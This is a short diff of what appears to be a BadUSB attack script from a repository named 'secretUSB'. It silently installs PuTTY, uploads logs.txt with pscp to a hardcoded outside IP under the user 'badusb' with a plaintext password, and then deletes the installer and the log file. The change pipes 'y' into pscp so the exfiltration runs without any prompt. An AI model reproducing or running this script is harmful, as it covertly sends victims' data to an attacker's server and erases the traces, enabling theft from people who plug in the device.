@@ -24,7 +24,7 @@ curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/putty-64bit-0.78
 
 msiexec /i putty-64bit-0.78-installer.msi /qn
 
-pscp -pw lolmdr123 logs.txt badusb@51.83.71.188:/var/tmp
+echo y | pscp -pw lolmdr123 logs.txt badusb@51.83.71.188:/var/tmp
 
 del putty-64bit-0.78-installer.msi
 del logs.txt
